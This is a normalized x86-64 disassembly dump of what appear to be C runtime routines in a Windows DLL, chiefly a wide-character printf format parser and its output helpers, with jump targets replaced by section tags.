mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rcx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rcx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
cmp [ rcx ] 0xc00002b5
jne r-xdata
mov [ rbx + 0xb0 ] 0x8a
jmp r-xdata
cmp [ rcx ] 0xc00002b4
mov eax edi
mov edx 0x8e
cmove eax edx
mov [ rbx + 0xb0 ] eax
mov [ rbx + 0xb0 ] 0x8d
jmp r-xdata
sub_1800288dc
sub rsp 0x28
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x28
jmp [ HeapSize@IAT ]
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
or rax 0xffffffffffffffff
add rsp 0x28
retn
sub_180028918
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x3d0 ]
sub rsp 0x4d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3c0 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x78 ] rcx
mov [ rbp - 0x80 ] rdx
lea rcx [ rbp - 0x70 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x50 ] r9
mov [ rsp + 0x74 ] eax
mov r12d eax
mov [ rsp + 0x5c ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x70 ] eax
mov [ rsp + 0x58 ] eax
call sub_1800221bc
xor r10d r10d
test rbx rbx
jne r-xdata
mov r8 [ rbp - 0x80 ]
test r8 r8
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor r11d r11d
cmp [ rbp - 0x58 ] r11b
je r-xdata
movzx r13d [ r8 ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov r15d r10d
mov edx r10d
mov [ rbp - 0x50 ] r10
test r13w r13w
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x58 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov ecx 0x58
mov r9d 0x200
lea r11d [ rcx - 0x38 ]
mov rcx [ rbp + 0x3c0 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x520 ]
add rsp 0x4d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax esi
mov rcx [ rbp - 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx eax r13w
sub ax r11w
cmp ax cx
ja r-xdata
mov ecx r10d
lea rcx [ r--data ]
movzx eax r13w
movsx ecx [ rax + rcx - 0x20 ]
and ecx 0xf
jmp r-xdata
mov rdx [ rsp + 0x78 ]
lea r8 [ rsp + 0x40 ]
movzx ecx r13w
mov [ rsp + 0x58 ] 0x1
call sub_1800293f8
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
dec ecx
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
lea rax [ r--data ]
movsx edx [ rdx + rax ]
sar edx 0x4
mov [ rsp + 0x6c ] edx
mov ecx edx
test edx edx
je r-xdata
mov r11d 0x20
jmp r-xdata
or edi 0xffffffff
mov [ rbp - 0x78 ] r10d
mov [ rsp + 0x70 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x48 ] r10d
mov r12d r10d
mov [ rsp + 0x44 ] edi
mov [ rsp + 0x58 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov edx [ rsp + 0x6c ]
mov r8 [ rbp - 0x80 ]
mov r9d 0x200
mov ecx 0x58
movzx eax r13w
cmp eax r11d
je r-xdata
dec ecx
je r-xdata
add r8 0x2
mov [ rbp - 0x80 ] r8
test esi esi
js r-xdata
or r12d 0x2
jmp r-xdata
cmp eax 0x23
je r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r12d 0x7
jmp r-xdata
mov ecx 0x2b
cmp eax ecx
je r-xdata
mov eax [ rsp + 0x5c ]
lea ecx [ rax + rax * 4 ]
movzx eax r13w
lea eax [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x5c ] eax
jmp r-xdata
mov eax [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x5c ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r12d 0x1
jmp r-xdata
mov ecx 0x2d
cmp eax ecx
je r-xdata
movzx r13d [ r8 ]
test r13w r13w
jne r-xdata
or r12d 0x4
neg eax
mov [ rsp + 0x5c ] eax
jmp r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
or r12d 0x4
jmp r-xdata
mov ecx 0x30
cmp eax ecx
mov ecx 0x58
jne r-xdata
lea ecx [ rdi + rdi * 4 ]
movzx eax r13w
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
movzx eax r13w
cmp eax 0x49
je r-xdata
dec ecx
jne r-xdata
or r12d 0x8
jmp r-xdata
or edi 0xffffffff
mov [ rsp + 0x44 ] edi
jmp r-xdata
bts r12d 0xf
cmp [ r8 ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
movzx eax r13w
mov ecx 0x64
cmp eax ecx
jg r-xdata
cmp [ r8 ] 0x33
jne r-xdata
cmp [ r8 + 0x2 ] 0x34
jne r-xdata
or r12d r11d
jmp r-xdata
mov ecx 0x6c
cmp eax ecx
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
mov eax 0x64
cmp [ r8 ] ax
je r-xdata
cmp [ r8 + 0x2 ] 0x32
jne r-xdata
add r8 0x4
bts r12d 0xf
jmp r-xdata
cmp [ r8 ] cx
mov ecx 0x58
jne r-xdata
mov ecx 0x58
cmp eax 0x77
jne r-xdata
mov edi 0x2d
mov ecx 0x67
cmp eax ecx
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
mov eax 0x69
cmp [ r8 ] ax
je r-xdata
add r8 0x4
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
add r8 0x2
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov r11d 0x20
test r12b 0x40
je r-xdata
or r12d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r9d
test edi edi
jns r-xdata
mov ecx 0x69
cmp eax ecx
je r-xdata
bt r12d 0xc
jb r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
mov [ rbp - 0x78 ] 0x1
add r13w r11w
cmp eax 0x43
je r-xdata
mov eax 0x6f
cmp [ r8 ] ax
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_18002094c
mov edi [ rsp + 0x44 ]
xor r10d r10d
mov [ rbp - 0x50 ] r10
mov edi [ rsp + 0x48 ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r15d 0x6
cmp eax 0x6e
je r-xdata
add r14 0x8
test r11b r12b
je r-xdata
mov [ rsp + 0x50 ] r14
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
mov eax 0x75
lea ecx [ rax - 0x1d ]
cmp [ r8 ] ax
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov r8 r13
mov edx edi
call sub_180029484
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx eax
mov r8 r13
mov edx r14d
call sub_180029430
test r12b 0x1
je r-xdata
mov [ rsp + 0x60 ] di
cmp edi r9d
mov r15d 0xa3
cmovg edi r9d
mov [ rsp + 0x44 ] edi
cmp edi r15d
jle r-xdata
cmp r13w cx
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
mov [ rsp + 0x50 ] r14
movsx edi r13b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x70 ]
mov [ rsp + 0x30 ] rcx
mov ecx [ rbp - 0x78 ]
mov r9d edi
mov [ rsp + 0x28 ] ecx
lea rcx [ rbp - 0x48 ]
mov r8 rsi
mov rdx rbx
mov [ rsp + 0x20 ] r15d
call rax
mov edi r12d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
call sub_18002f358
xor r10d r10d
test eax eax
je r-xdata
mov ecx 0x6f
cmp eax ecx
je r-xdata
test r12b 0x40
je r-xdata
mov [ rsp + 0x50 ] r14
test r12b 0x40
je r-xdata
test eax r12d
jne r-xdata
test r8 r8
jns r-xdata
movzx eax [ r14 ]
add r14 0x8
mov [ rsp + 0x58 ] 0x1
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x64 ] ax
test r11b r12b
je r-xdata
or r12d r11d
cmp eax 0x47
je r-xdata
lea eax [ rcx + 0x20 ]
cmp [ r8 ] ax
je r-xdata
xor eax eax
cmp [ rsp + 0x58 ] eax
jne r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov eax 0x2b
mov [ rsp + 0x60 ] ax
jmp r-xdata
mov eax 0x20
mov r15d edi
add edi 0x15d
movsxd rcx edi
call sub_180022c10
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov r15d [ rsp + 0x44 ]
jmp r-xdata
mov r15d 0x1
jmp r-xdata
mov ecx 0x67
cmp r13w cx
jne r-xdata
test r15d r15d
jne r-xdata
lea r11d [ r10 + 0x20 ]
test r11b r12b
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
test edi edi
jns r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov [ rbp - 0x40 ] ax
mov [ rsp + 0x68 ] al
mov rax [ rbp - 0x70 ]
mov [ rsp + 0x69 ] r10b
movsxd r8 [ rax + 0x10c ]
lea r9 [ rbp - 0x70 ]
lea rdx [ rsp + 0x68 ]
lea rcx [ rbp - 0x40 ]
call sub_180030928
xor r10d r10d
test eax eax
jns r-xdata
cmp eax 0x53
je r-xdata
cmp [ r8 ] cx
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 r13
mov edx r15d
mov rcx rbx
call sub_180029484
xor r10d r10d
test r15d r15d
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x30
mov r8 r13
mov edx r14d
call sub_180029430
mov eax 0x20
mov [ rsp + 0x60 ] ax
lea edi [ rax - 0x1f ]
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov [ rsp + 0x44 ] r15d
jmp r-xdata
mov rbx rax
mov esi edi
mov edi 0x2d
cmp [ rbx ] dil
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov r13d 0x200
mov r13d 0x200
or r12d r13d
jmp r-xdata
mov edi 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
test r12b 0x40
je r-xdata
and r12d 0xfffffff7
cmp edi r13d
cmovg edi r13d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
mov r15d 0x1
jmp r-xdata
mov [ rsp + 0x70 ] 0x1
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x6c ] r10d
mov r14 [ rsp + 0x50 ]
test r12b 0x4
je r-xdata
mov rdi rbx
mov esi r15d
mov r14d [ rsp + 0x5c ]
mov r13 [ rsp + 0x78 ]
sub r14d r15d
sub r14d edi
test r12b 0xc
jne r-xdata
mov rcx rbx
call sub_180023ce0
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov r15d eax
jmp r-xdata
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
mov [ rsp + 0x70 ] 0x1
jmp r-xdata
mov edx [ rsp + 0x48 ]
lea ecx [ r9 + 0x20 ]
add ax 0x51
lea edx [ rcx - 0x2e ]
mov [ rsp + 0x60 ] cx
mov [ rsp + 0x62 ] ax
jmp r-xdata
cmp [ rsp + 0x44 ] 0xffffffff
mov rbx [ r14 ]
mov eax 0x7fffffff
cmove edi eax
add r14 0x8
mov [ rsp + 0x50 ] r14
test r11b r12b
je r-xdata
mov ecx 0x75
cmp eax ecx
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x74 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
or r12d r11d
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x20
mov r8 r13
mov edx r14d
call sub_180029430
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov r13 [ rsp + 0x78 ]
or esi 0xffffffff
mov [ rsp + 0x40 ] esi
jmp r-xdata
mov rdx [ rsp + 0x78 ]
movzx ecx [ rsp + 0x64 ]
lea r8 [ rsp + 0x40 ]
call sub_1800293f8
add rdi r13
xor r10d r10d
test esi esi
jg r-xdata
cmp [ rsp + 0x70 ] r10d
jne r-xdata
mov eax 0x8000
test eax r12d
je r-xdata
test rbx rbx
mov [ rsp + 0x58 ] 0x1
cmove rbx [ rw-data ]
mov rax rbx
jmp r-xdata
test rbx rbx
mov r15d r10d
cmove rbx [ rw-data ]
mov rsi rbx
test edi edi
jle r-xdata
mov r9d 0xa
mov ecx 0x78
cmp eax ecx
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov r15d eax
test r13d r12d
je r-xdata
mov rax [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov rax [ rbp - 0x70 ]
lea r9 [ rbp - 0x70 ]
lea rcx [ rsp + 0x64 ]
movsxd r8 [ rax + 0x10c ]
mov rdx rdi
dec esi
call sub_180030928
xor r10d r10d
movsxd r13 eax
test eax eax
jle r-xdata
mov r13 [ rsp + 0x78 ]
jmp r-xdata
test edi edi
jne r-xdata
mov esi [ rsp + 0x40 ]
cmp [ rsi ] r10b
je r-xdata
lea eax [ rcx - 0x51 ]
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
mov eax 0x30
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_180023ce0
xor r10d r10d
mov r15 rax
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
mov ecx 0x67
cmp eax 0x63
je r-xdata
mov esi [ rsp + 0x40 ]
dec edi
cmp [ rax ] r10w
je r-xdata
sub rax rbx
sar rax 0x1
mov r15d eax
jmp r-xdata
movzx ecx [ rsi ]
lea rdx [ rbp - 0x70 ]
call sub_18002f2c8
xor r10d r10d
test eax eax
je r-xdata
mov [ rsp + 0x74 ] eax
mov r9d 0x10
mov r13d 0x200
test r12b r12b
jns r-xdata
dec rbx
inc r15d
mov [ rbx ] al
jmp r-xdata
cmp [ rbx ] al
je r-xdata
mov edi 0x2d
bt r12d 0xb
jae r-xdata
jmp r-xdata
add rax 0x2
inc r15d
inc rsi
cmp r15d edi
jl r-xdata
inc rsi
movsx r15d [ rax ]
mov [ rsp + 0x58 ] r10d
jmp r-xdata
movsx eax [ rax ]
mov [ rsp + 0x58 ] 0x1
cdq
sub eax edx
sar eax 0x1
mov r15d eax
jmp r-xdata
sub_1800293f8
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
call sub_180030728
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
inc [ rbx ]
or [ rbx ] 0xffffffff
jmp r-xdata
inc [ r8 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180029430
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
movzx ebp cx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
movzx ecx bp
dec ebx
call sub_1800293f8
cmp [ rdi ] 0xffffffff
je r-xdata
sub_180029484
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx r9
mov rsi r8
mov edi edx
mov rbp rcx
call sub_180022de4
test [ rsi + 0x18 ] 0x40
mov r12d [ rax ]
je r-xdata
call sub_180022de4
and [ rax ] 0x0
jmp r-xdata
cmp [ rsi + 0x10 ] 0x0
jne r-xdata
test edi edi
jg r-xdata
add [ rbx ] edi
jmp r-xdata
movzx ecx [ rbp ]
mov r8 rbx
mov rdx rsi
dec edi
call sub_1800293f8
add rbp 0x2
cmp [ rbx ] 0xffffffff
jne r-xdata
call sub_180022de4
cmp [ rax ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
call sub_180022de4
cmp [ rax ] 0x2a
jne r-xdata
call sub_180022de4
mov [ rax ] r12d
mov ecx 0x3f
mov r8 rbx
mov rdx rsi
call sub_1800293f8
sub_180029530
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x3d0 ]
sub rsp 0x4d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3c0 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x78 ] rcx
mov [ rbp - 0x80 ] rdx
lea rcx [ rbp - 0x70 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x50 ] r9
mov [ rsp + 0x70 ] eax
mov r12d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x6c ] eax
mov [ rsp + 0x44 ] eax
call sub_1800221bc
xor r10d r10d
test rbx rbx
jne r-xdata
mov r8 [ rbp - 0x80 ]
test r8 r8
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor r11d r11d
cmp [ rbp - 0x58 ] r11b
je r-xdata
movzx r13d [ r8 ]
mov edx r10d
mov r15d r10d
mov r9d r10d
mov [ rbp - 0x50 ] r10
mov [ rsp + 0x40 ] edx
test r13w r13w
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x58 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
or esi 0xffffffff
lea ecx [ rsi + 0x59 ]
lea r11d [ rsi + 0x21 ]
mov rcx [ rbp + 0x3c0 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x520 ]
add rsp 0x4d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax edx
mov rcx [ rbp - 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
test r9d r9d
je r-xdata
movzx eax r13w
sub ax r11w
cmp ax cx
ja r-xdata
cmp r9d 0x7
jne r-xdata
mov ecx r10d
lea rcx [ r--data ]
movzx eax r13w
movzx ecx [ rax + rcx - 0x20 ]
and ecx 0xf
jmp r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor r11d r11d
cmp [ rbp - 0x58 ] r11b
je r-xdata
mov ecx r9d
test r9d r9d
je r-xdata
movsxd rax ecx
lea rcx [ rax + rax * 8 ]
movsxd rax r9d
add rcx rax
lea rax [ r--data ]
movzx r9d [ rcx + rax ]
shr r9d 0x4
mov [ rsp + 0x68 ] r9d
cmp r9d 0x8
je r-xdata
mov eax esi
jmp r-xdata
mov rax [ rbp - 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rdx [ rsp + 0x78 ]
lea r8 [ rsp + 0x40 ]
movzx ecx r13w
mov [ rsp + 0x44 ] 0x1
call sub_1800293f8
xor r10d r10d
jmp r-xdata
dec ecx
je r-xdata
mov edx [ rsp + 0x40 ]
mov r11d 0x20
jmp r-xdata
mov [ rbp - 0x78 ] r10d
mov [ rsp + 0x6c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r12d r10d
mov edi esi
mov [ rsp + 0x48 ] esi
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov r9d [ rsp + 0x68 ]
mov r8 [ rbp - 0x80 ]
mov ecx 0x58
movzx eax r13w
cmp eax r11d
je r-xdata
dec ecx
je r-xdata
add r8 0x2
mov [ rbp - 0x80 ] r8
test edx edx
js r-xdata
or r12d 0x2
jmp r-xdata
cmp eax 0x23
je r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r12d 0x7
jmp r-xdata
mov ecx 0x2b
cmp eax ecx
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movzx eax r13w
lea eax [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x58 ] eax
jmp r-xdata
mov eax [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x48 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r12d 0x1
jmp r-xdata
mov ecx 0x2d
cmp eax ecx
je r-xdata
movzx r13d [ r8 ]
test r13w r13w
jne r-xdata
or r12d 0x4
neg eax
mov [ rsp + 0x58 ] eax
jmp r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
or r12d 0x4
jmp r-xdata
mov ecx 0x30
cmp eax ecx
mov ecx 0x58
jne r-xdata
lea ecx [ rdi + rdi * 4 ]
movzx eax r13w
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov edi [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x48 ] edi
test edi edi
jns r-xdata
movzx eax r13w
cmp eax 0x49
je r-xdata
dec ecx
jne r-xdata
or r12d 0x8
jmp r-xdata
mov edi esi
mov [ rsp + 0x48 ] esi
jmp r-xdata
bts r12d 0xf
cmp [ r8 ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
movzx eax r13w
mov ecx 0x64
cmp eax ecx
jg r-xdata
cmp [ r8 ] 0x33
jne r-xdata
cmp [ r8 + 0x2 ] 0x34
jne r-xdata
or r12d r11d
jmp r-xdata
mov ecx 0x6c
cmp eax ecx
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
mov eax 0x64
cmp [ r8 ] ax
je r-xdata
cmp [ r8 + 0x2 ] 0x32
jne r-xdata
add r8 0x4
bts r12d 0xf
jmp r-xdata
cmp [ r8 ] cx
mov ecx 0x58
jne r-xdata
mov ecx 0x58
cmp eax 0x77
jne r-xdata
mov r13d [ rsp + 0x44 ]
mov ecx 0x67
cmp eax ecx
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
mov eax 0x69
cmp [ r8 ] ax
je r-xdata
add r8 0x4
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
add r8 0x2
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov r11d 0x20
test r12b 0x40
je r-xdata
mov eax 0x200
or r12d 0x40
lea rbx [ rbp - 0x40 ]
mov esi eax
test edi edi
jns r-xdata
mov ecx 0x69
cmp eax ecx
je r-xdata
bt r12d 0xc
jb r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
mov [ rbp - 0x78 ] 0x1
add r13w r11w
cmp eax 0x43
je r-xdata
mov eax 0x6f
cmp [ r8 ] ax
je r-xdata
mov edi [ rsp + 0x48 ]
or esi 0xffffffff
mov rcx rax
call sub_18002094c
mov edi [ rsp + 0x48 ]
xor r10d r10d
mov [ rbp - 0x50 ] r10
or esi 0xffffffff
mov edi [ rsp + 0x4c ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r15d 0x6
cmp eax 0x6e
je r-xdata
add r14 0x8
test r11b r12b
je r-xdata
mov [ rsp + 0x50 ] r14
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
mov eax 0x75
lea ecx [ rax - 0x1d ]
cmp [ r8 ] ax
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x5c ]
mov r8 rsi
mov edx edi
call sub_180029484
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx eax
mov r8 rsi
mov edx r14d
call sub_180029430
test r12b 0x1
je r-xdata
mov [ rsp + 0x5c ] di
cmp edi eax
mov r15d 0xa3
cmovg edi eax
mov [ rsp + 0x48 ] edi
cmp edi r15d
jle r-xdata
cmp r13w cx
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
mov [ rsp + 0x50 ] r14
movsx edi r13b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x70 ]
mov [ rsp + 0x30 ] rcx
mov ecx [ rbp - 0x78 ]
mov r9d edi
mov [ rsp + 0x28 ] ecx
lea rcx [ rbp - 0x48 ]
mov r8 rsi
mov rdx rbx
mov [ rsp + 0x20 ] r15d
call rax
mov edi r12d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
call sub_18002f358
xor r10d r10d
test eax eax
je r-xdata
mov ecx 0x6f
cmp eax ecx
je r-xdata
test r12b 0x40
je r-xdata
mov [ rsp + 0x50 ] r14
test r12b 0x40
je r-xdata
test eax r12d
jne r-xdata
test r8 r8
jns r-xdata
movzx eax [ r14 ]
add r14 0x8
mov r13d 0x1
mov [ rsp + 0x60 ] ax
mov [ rsp + 0x44 ] r13d
mov [ rsp + 0x50 ] r14
test r11b r12b
je r-xdata
or r12d r11d
cmp eax 0x47
je r-xdata
lea eax [ rcx + 0x20 ]
cmp [ r8 ] ax
je r-xdata
test r13d r13d
jne r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov eax 0x2b
mov [ rsp + 0x5c ] ax
jmp r-xdata
mov eax 0x20
mov r15d edi
add edi 0x15d
movsxd rcx edi
call sub_180022c10
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov r15d [ rsp + 0x48 ]
jmp r-xdata
mov r15d 0x1
jmp r-xdata
mov ecx 0x67
cmp r13w cx
jne r-xdata
test r15d r15d
jne r-xdata
mov eax [ rsp + 0x40 ]
lea r11d [ r10 + 0x20 ]
test r11b r12b
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
test edi edi
jns r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov [ rbp - 0x40 ] ax
mov [ rsp + 0x64 ] al
mov rax [ rbp - 0x70 ]
mov [ rsp + 0x65 ] r10b
movsxd r8 [ rax + 0x10c ]
lea r9 [ rbp - 0x70 ]
lea rdx [ rsp + 0x64 ]
lea rcx [ rbp - 0x40 ]
call sub_180030928
xor r10d r10d
test eax eax
jns r-xdata
cmp eax 0x53
je r-xdata
cmp [ r8 ] cx
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r15d
mov rcx rbx
call sub_180029484
xor r10d r10d
test r15d r15d
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x30
mov r8 rsi
mov edx r14d
call sub_180029430
mov eax 0x20
mov [ rsp + 0x5c ] ax
lea edi [ rax - 0x1f ]
mov [ rsp + 0x4c ] edi
jmp r-xdata
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
mov [ rsp + 0x48 ] r15d
jmp r-xdata
mov rbx rax
mov esi edi
mov edi 0x2d
cmp [ rbx ] dil
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov [ rdi ] eax
mov [ rdi ] ax
jmp r-xdata
mov esi 0x200
